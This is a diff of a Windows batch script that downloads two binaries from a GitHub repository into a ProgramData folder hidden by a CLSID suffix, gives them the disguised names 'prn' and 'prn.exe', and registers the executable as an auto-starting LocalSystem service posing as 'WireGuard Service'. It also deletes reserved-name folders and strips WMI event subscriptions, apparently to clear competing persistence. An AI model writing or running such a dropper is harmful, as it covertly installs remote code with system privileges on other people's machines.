@@ -5,7 +5,7 @@ mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
 %WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" https://github.com/vltex/0/raw/main/1/wintun.dll
 %WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe" https://github.com/vltex/0/raw/main/1/Wire.exe
 
-sc create WireGuard binPath="\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" start="auto" obj="LocalSystem"
+sc create WireGuard binPath="\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn.exe \\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\prn" DisplayName= "WireGuard Service" start="auto" obj="LocalSystem"
 
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
@@ -41,8 +41,6 @@ wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="MCS
 
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Report" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Report" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Report"' DELETE
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="Health" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="Health" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="Health"' DELETE
-
-start "" %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Wire.exe %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*SCM*' -or $_.Consumer -like '*SCM*' } | Remove-WmiObject"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='SCM'\" | Remove-WmiObject"
